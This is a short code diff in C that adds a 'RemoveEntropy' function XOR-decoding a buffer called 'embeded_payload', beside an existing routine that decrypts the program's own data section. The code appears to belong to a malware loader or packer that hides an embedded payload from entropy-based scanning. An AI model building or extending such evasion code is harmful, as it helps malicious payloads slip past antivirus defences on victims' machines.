@@ -84,6 +84,14 @@ void DecryptRDataSection()
     //VirtualProtect(addr, sectionSize, PAGE_READONLY, &oldProtect);
 }
 
+int BUFFER_Size = 205;
+
+void RemoveEntropy()
+{
+    for (int i = 0; i < BUFFER_Size; i++)
+        embeded_payload[i] = embeded_payload[i] ^ (embeded_payload[i + BUFFER_Size] << 4);
+}
+
 int main()
 {
     
